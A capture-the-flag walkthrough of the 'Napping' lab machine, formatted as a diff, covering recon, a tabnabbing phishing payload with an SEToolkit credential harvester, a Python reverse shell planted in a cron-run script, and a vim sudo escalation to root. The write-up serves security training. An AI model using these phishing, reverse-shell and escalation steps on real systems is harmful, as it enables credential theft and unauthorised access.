@@ -1,0 +1,205 @@
+///Napping///
+
+[NMAP SCAN]
+
+nmap -T4 -sV [Machine IP]   
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 23:25 EDT
+Nmap scan report for 10.10.37.200
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[GOBUSTER]
+
+gobuster dir -u [machine IP] -w /path/to/wordlist.txt -t 250 -x txt,html,php --no-error
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.37.200
+[+] Method:                  GET
+[+] Threads:                 250
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,html,php
+[+] Timeout:                 10s
+===============================================================
+2022/03/29 23:31:15 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 312] [--> http://10.10.37.200/admin/]
+/index.php            (Status: 200) [Size: 1211]                                
+/welcome.php          (Status: 302) [Size: 0] [--> index.php]                   
+/logout.php           (Status: 302) [Size: 0] [--> index.php]                   
+/config.php           (Status: 200) [Size: 1]   
+
+Looking more into /admin/:
+
+gobuster dir -u [Machine IP]/admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250 -x txt,html,php --no-error                                                                                                1 ⚙
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.37.200/admin/
+[+] Method:                  GET
+[+] Threads:                 250
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+2022/03/29 23:54:13 Starting gobuster in directory enumeration mode
+===============================================================
+/welcome.php          (Status: 302) [Size: 0] [--> login.php]
+/login.php            (Status: 200) [Size: 1158]             
+/logout.php           (Status: 302) [Size: 0] [--> login.php]
+
+
+Navigate to http://[Machine IP], and we get a login screen.
+Go ahead and make an account and login.
+The homescreen asks us to submit a link for a blog promotion that their admins will review. I tried entering various things in there, and for the hell of it
+I tried to do an alert box to see if anything would happen (<script>alert('hello')</script>), and it returned with:
+
+Thank you for your submission, you have entered: ' target='_blank' >Here
+
+Which, the ' target=_'_blank' caught my eye and looked pretty sus. Turns out, it is vulnerable to something called "Tab Nabbing", which we can use to redirect the admin
+to a phishing site that we've created in order to get their credentials.
+
+We found an admin login earlier with our Gobuster scan, which will work perfectly for this.
+
+Basically, what will happen is we will create a copy of this login page. Then, we create another page that has the payload (which is supposedly our "blog" site for the admin to review), which will redirect them to the malicious login page when they click on it.
+
+https://thecodest.co/blog/web-app-security-target-_blank-vulnerability for more information on this vulnerability.
+
+The payload for our "blog" will be:
+
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+            window.opener.location='http://[Your tun0 IP]:80';
+        </script>
+    </body>
+</html>
+
+save as something like blog.html
+
+I used SE Toolkit to help with this next part:
+
+sudo setoolkit
+
+Choose:
+option 2.) Website Attack Vectors
+option 3.) Credential Harvester Attack Method
+option 2.) Site Cloner
+
+When asked what IP Address for the POST back in Harvester/Tabnabbing, enter the victim machine IP
+And the URL to enter at the next prompt will be: http://[machine IP]/admin/login.php
+
+Start a simple web server (on a port other than 80, since our malicious login page with SEToolKit is running on 80) which we will use for sending the blog.html to the review process.
+
+python3 -m http.server 9000
+
+Back to the welcome page, in the Blog Link box enter http://[YourIP]:9000/blog.html  (or use whatever port you specified above)
+And now, we wait until back in our SEToolKit window:
+
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80                                                                                                                                                                                               
+[*] Information will be displayed to you as it arrives below:                                                                                                                                                                                
+10.9.9.110 - - [30/Mar/2022 00:33:02] "GET / HTTP/1.1" 200 -
+10.9.9.110 - - [30/Mar/2022 00:33:04] "GET /favicon.ico HTTP/1.1" 404 -
+10.10.37.200 - - [30/Mar/2022 00:37:03] "GET / HTTP/1.1" 200 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: username=daniel                                                                                                                                                                                               
+POSSIBLE PASSWORD FIELD FOUND: password=[xxx real password is here xxx]                                                                                                                                                                                   
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                                                                                                                                                
+
+It worked! Let's try logging in.
+And when we do... we don't get much. Just a space for submitted links and an option to sign out.
+Well, the other port that is open is SSH, so maybe these credentials will work for that, too?
+
+ssh daniel@[Machine IP]
+Enter password
+
+Success!
+
+However, user.txt is in user adrian's folder, and we are met with a permission denied if we try to open it.
+Running sudo -l also tells us that daniel may not run sudo on napping.
+There is however one other file in adrian's home folder, called "query.py", which contains:
+
+from datetime import datetime
+import requests
+
+now = datetime.now()
+
+r = requests.get('http://127.0.0.1/')
+if r.status_code == 200:
+    f = open("site_status.txt","a")
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    f.write("Site is Up: ")
+    f.write(dt_string)
+    f.write("\n")
+    f.close()
+else:
+    f = open("site_status.txt","a")
+    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
+    f.write("Check Out Site: ")
+    f.write(dt_string)
+    f.write("\n")
+    f.close()
+
+Before diving any deeper into this one, I decided to look around a little bit first (path of least resistance, right?)
+
+/var/www/html/ contains a config.php file. Catting it out reveals:
+
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'adrian');
+define('DB_PASSWORD', 'Stop@Napping3!');
+define('DB_NAME', 'website');
+
+/* Attempt to connect to MySQL database */
+$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+
+// Check connection
+if($mysqli === false){
+        die("ERROR: Could not connect. " . $mysqli->connect_error);
+}
+?>
+
+However, this doesn't work if we try to switch over to user adrian. Enumerating the databases with this login did not lead to anything, either.
+
+Back to the query.py file.
+
+It looks like this is actually writable (I saw at the bottom of nano that the directory was not writable, and I mistook that for the file not being writable!)
+Let's replace the contents with:
+
+import os, pty, socket
+
+s = socket.socket()    
+s.connect(("[your tun0 IP]", port))
+[os.dup2(s.fileno(), f) for f in (0, 1, 2)]
+pty.spawn("bash")
+
+and since this executes every minute or so, we can quickly get a shell as adrian by starting a listener next and waiting:
+
+nc -lvnp [port]
+
+We may now get the user.txt flag!
+
+Sudo -l says:
+
+User adrian may run the following commands on napping:
+    (root) NOPASSWD: /usr/bin/vim
+
+Which, according to gtfobins, is easy enough to exploit and gain root.
+Just run: sudo vim -c ':!/bin/sh'
+
+Congrats! root.txt is in /root/
